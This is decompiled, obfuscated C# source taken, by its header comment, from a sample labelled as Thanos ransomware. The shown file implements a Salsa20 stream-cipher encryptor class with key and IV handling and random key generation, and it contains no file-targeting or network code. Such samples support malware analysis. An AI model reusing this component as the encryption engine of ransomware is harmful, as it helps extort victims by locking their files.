// Decompiled with JetBrains decompiler
// Type: oFbodOYJTt.RpWKlAyYXuFg
// Assembly: chaddad, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6BDE87D8-B0AC-468F-B40C-8A894553F651
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Thanos.gen-66ed5384220ff3091903e14a54849f824fdd13ac70dc4e0127eb59c1de801fc2.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace oFbodOYJTt
{
  public sealed class RpWKlAyYXuFg : SymmetricAlgorithm
  {
    private int mYtYDbvgMHIPa;
    [NonSerialized]
    internal static GetString \u0004;

    public static byte[] pUQagweWpoRi([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray1 = obj1;
      byte[] numArray2 = obj2;
      using (RpWKlAyYXuFg rpWklAyYxuFg = new RpWKlAyYXuFg())
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          rpWklAyYxuFg.Key = numArray1;
          rpWklAyYxuFg.IV = numArray2;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rpWklAyYxuFg.CreateEncryptor(), CryptoStreamMode.Write))
          {
            byte[] buffer = obj0;
            cryptoStream.Write(buffer, 0, buffer.Length);
            cryptoStream.FlushFinalBlock();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public RpWKlAyYXuFg()
    {
      this.LegalBlockSizesValue = new KeySizes[1]
      {
        new KeySizes(512, 512, 0)
      };
      this.LegalKeySizesValue = new KeySizes[1]
      {
        new KeySizes(128, 256, 128)
      };
      this.BlockSizeValue = 512;
      this.KeySizeValue = 256;
      this.mYtYDbvgMHIPa = 20;
    }

    [SpecialName]
    public override byte[] get_IV() => base.IV;

    [SpecialName]
    public override void set_IV([In] byte[] obj0)
    {
      RpWKlAyYXuFg.YvOvKSFpZqFm(obj0, RpWKlAyYXuFg.\u0004(107401099));
      this.IVValue = (byte[]) obj0.Clone();
    }

    public override ICryptoTransform CreateDecryptor([In] byte[] obj0, [In] byte[] obj1) => this.CreateEncryptor(obj0, obj1);

    public override ICryptoTransform CreateEncryptor([In] byte[] obj0, [In] byte[] obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(RpWKlAyYXuFg.\u0004(107401058));
      if (!this.ValidKeySize(obj0.Length * 8))
        throw new CryptographicException(RpWKlAyYXuFg.\u0004(107401049));
      RpWKlAyYXuFg.YvOvKSFpZqFm(obj1, RpWKlAyYXuFg.\u0004(107400988));
      return (ICryptoTransform) new RpWKlAyYXuFg.WquxYoZJZlnnnK(obj0, obj1, this.mYtYDbvgMHIPa);
    }

    public override void GenerateIV() => this.IVValue = RpWKlAyYXuFg.CTDVtXwblPyI(8);

    public override void GenerateKey() => this.KeyValue = RpWKlAyYXuFg.CTDVtXwblPyI(this.KeySize / 8);

    private static void YvOvKSFpZqFm([In] byte[] obj0, [In] string obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(obj1);
      if (obj0.Length != 8)
        throw new CryptographicException(RpWKlAyYXuFg.\u0004(107401011));
    }

    private static byte[] CTDVtXwblPyI([In] int obj0)
    {
      byte[] data = new byte[obj0];
      using (RandomNumberGenerator randomNumberGenerator = (RandomNumberGenerator) new RNGCryptoServiceProvider())
        randomNumberGenerator.GetBytes(data);
      return data;
    }

    static RpWKlAyYXuFg() => Strings.CreateGetStringDelegate(typeof (RpWKlAyYXuFg));

    private sealed class WquxYoZJZlnnnK : ICryptoTransform, IDisposable
    {
      private static readonly byte[] qWDvnGKTmVeYpN;
      private static readonly byte[] cZNtwQkRYK;
      private readonly int mYtYDbvgMHIPa;
      private uint[] pfMgqCfTVqZNTr;
      [NonSerialized]
      internal static GetString \u0005;

      public WquxYoZJZlnnnK([In] byte[] obj0, [In] byte[] obj1, [In] int obj2)
      {
        this.Initialize(obj0, obj1);
        this.mYtYDbvgMHIPa = obj2;
      }

      [SpecialName]
      public bool get_CanReuseTransform() => false;

      [SpecialName]
      public bool get_CanTransformMultipleBlocks() => true;

      [SpecialName]
      public int get_InputBlockSize() => 64;

      [SpecialName]
      public int get_OutputBlockSize() => 64;

      public int TransformBlock([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] byte[] obj3, [In] int obj4)
      {
        if (obj0 == null)
          throw new ArgumentNullException(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400935));
        if (obj1 < 0 || obj1 >= obj0.Length)
          throw new ArgumentOutOfRangeException(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400950));
        if (obj2 < 0 || obj1 + obj2 > obj0.Length)
          throw new ArgumentOutOfRangeException(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400901));
        if (obj3 == null)
          throw new ArgumentNullException(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400916));
        if (obj4 < 0 || obj4 + obj2 > obj3.Length)
          throw new ArgumentOutOfRangeException(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400867));
        if (this.pfMgqCfTVqZNTr == null)
          throw new ObjectDisposedException(this.GetType().Name);
        byte[] numArray = new byte[64];
        int num1 = 0;
        while (obj2 > 0)
        {
          this.Hash(numArray, this.pfMgqCfTVqZNTr);
          this.pfMgqCfTVqZNTr[8] = RpWKlAyYXuFg.WquxYoZJZlnnnK.AddOne(this.pfMgqCfTVqZNTr[8]);
          if (this.pfMgqCfTVqZNTr[8] == 0U)
            this.pfMgqCfTVqZNTr[9] = RpWKlAyYXuFg.WquxYoZJZlnnnK.AddOne(this.pfMgqCfTVqZNTr[9]);
          int num2 = Math.Min(64, obj2);
          for (int index = 0; index < num2; ++index)
            obj3[obj4 + index] = (byte) ((uint) obj0[obj1 + index] ^ (uint) numArray[index]);
          num1 += num2;
          obj2 -= 64;
          obj4 += 64;
          obj1 += 64;
        }
        return num1;
      }

      public byte[] TransformFinalBlock([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        byte[] numArray = obj2 >= 0 ? new byte[obj2] : throw new ArgumentOutOfRangeException(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400901));
        this.TransformBlock(obj0, obj1, obj2, numArray, 0);
        return numArray;
      }

      public void Dispose()
      {
        if (this.pfMgqCfTVqZNTr != null)
          Array.Clear((Array) this.pfMgqCfTVqZNTr, 0, this.pfMgqCfTVqZNTr.Length);
        this.pfMgqCfTVqZNTr = (uint[]) null;
      }

      private static uint Rotate([In] uint obj0, [In] int obj1) => obj0 << obj1 | obj0 >> 32 - obj1;

      private static uint Add([In] uint obj0, [In] uint obj1) => obj0 + obj1;

      private static uint AddOne([In] uint obj0) => obj0 + 1U;

      private void Hash([In] byte[] obj0, [In] uint[] obj1)
      {
        uint[] numArray = (uint[]) obj1.Clone();
        for (int mYtYdbvgMhiPa = this.mYtYDbvgMHIPa; mYtYdbvgMhiPa > 0; mYtYdbvgMhiPa -= 2)
        {
          numArray[4] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[0], numArray[12]), 7);
          numArray[8] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[4], numArray[0]), 9);
          numArray[12] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[8], numArray[4]), 13);
          numArray[0] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[12], numArray[8]), 18);
          numArray[9] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[5], numArray[1]), 7);
          numArray[13] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[9], numArray[5]), 9);
          numArray[1] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[13], numArray[9]), 13);
          numArray[5] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[1], numArray[13]), 18);
          numArray[14] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[10], numArray[6]), 7);
          numArray[2] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[14], numArray[10]), 9);
          numArray[6] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[2], numArray[14]), 13);
          numArray[10] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[6], numArray[2]), 18);
          numArray[3] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[15], numArray[11]), 7);
          numArray[7] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[3], numArray[15]), 9);
          numArray[11] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[7], numArray[3]), 13);
          numArray[15] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[11], numArray[7]), 18);
          numArray[1] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[0], numArray[3]), 7);
          numArray[2] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[1], numArray[0]), 9);
          numArray[3] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[2], numArray[1]), 13);
          numArray[0] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[3], numArray[2]), 18);
          numArray[6] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[5], numArray[4]), 7);
          numArray[7] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[6], numArray[5]), 9);
          numArray[4] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[7], numArray[6]), 13);
          numArray[5] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[4], numArray[7]), 18);
          numArray[11] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[10], numArray[9]), 7);
          numArray[8] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[11], numArray[10]), 9);
          numArray[9] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[8], numArray[11]), 13);
          numArray[10] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[9], numArray[8]), 18);
          numArray[12] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[15], numArray[14]), 7);
          numArray[13] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[12], numArray[15]), 9);
          numArray[14] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[13], numArray[12]), 13);
          numArray[15] ^= RpWKlAyYXuFg.WquxYoZJZlnnnK.Rotate(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[14], numArray[13]), 18);
        }
        for (int index = 0; index < 16; ++index)
          RpWKlAyYXuFg.WquxYoZJZlnnnK.ToBytes(RpWKlAyYXuFg.WquxYoZJZlnnnK.Add(numArray[index], obj1[index]), obj0, 4 * index);
      }

      private void Initialize([In] byte[] obj0, [In] byte[] obj1)
      {
        this.pfMgqCfTVqZNTr = new uint[16];
        this.pfMgqCfTVqZNTr[1] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, 0);
        this.pfMgqCfTVqZNTr[2] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, 4);
        this.pfMgqCfTVqZNTr[3] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, 8);
        this.pfMgqCfTVqZNTr[4] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, 12);
        byte[] numArray = obj0.Length == 32 ? RpWKlAyYXuFg.WquxYoZJZlnnnK.qWDvnGKTmVeYpN : RpWKlAyYXuFg.WquxYoZJZlnnnK.cZNtwQkRYK;
        int num = obj0.Length - 16;
        this.pfMgqCfTVqZNTr[11] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, num);
        this.pfMgqCfTVqZNTr[12] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, num + 4);
        this.pfMgqCfTVqZNTr[13] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, num + 8);
        this.pfMgqCfTVqZNTr[14] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj0, num + 12);
        this.pfMgqCfTVqZNTr[0] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(numArray, 0);
        this.pfMgqCfTVqZNTr[5] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(numArray, 4);
        this.pfMgqCfTVqZNTr[10] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(numArray, 8);
        this.pfMgqCfTVqZNTr[15] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(numArray, 12);
        this.pfMgqCfTVqZNTr[6] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj1, 0);
        this.pfMgqCfTVqZNTr[7] = RpWKlAyYXuFg.WquxYoZJZlnnnK.ToUInt32(obj1, 4);
        this.pfMgqCfTVqZNTr[8] = 0U;
        this.pfMgqCfTVqZNTr[9] = 0U;
      }

      private static uint ToUInt32([In] byte[] obj0, [In] int obj1) => (uint) ((int) obj0[obj1] | (int) obj0[obj1 + 1] << 8 | (int) obj0[obj1 + 2] << 16 | (int) obj0[obj1 + 3] << 24);

      private static void ToBytes([In] uint obj0, [In] byte[] obj1, [In] int obj2)
      {
        obj1[obj2] = (byte) obj0;
        obj1[obj2 + 1] = (byte) (obj0 >> 8);
        obj1[obj2 + 2] = (byte) (obj0 >> 16);
        obj1[obj2 + 3] = (byte) (obj0 >> 24);
      }

      static WquxYoZJZlnnnK()
      {
        Strings.CreateGetStringDelegate(typeof (RpWKlAyYXuFg.WquxYoZJZlnnnK));
        RpWKlAyYXuFg.WquxYoZJZlnnnK.qWDvnGKTmVeYpN = Encoding.ASCII.GetBytes(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107400882));
        RpWKlAyYXuFg.WquxYoZJZlnnnK.cZNtwQkRYK = Encoding.ASCII.GetBytes(RpWKlAyYXuFg.WquxYoZJZlnnnK.\u0005(107401369));
      }
    }
  }
}
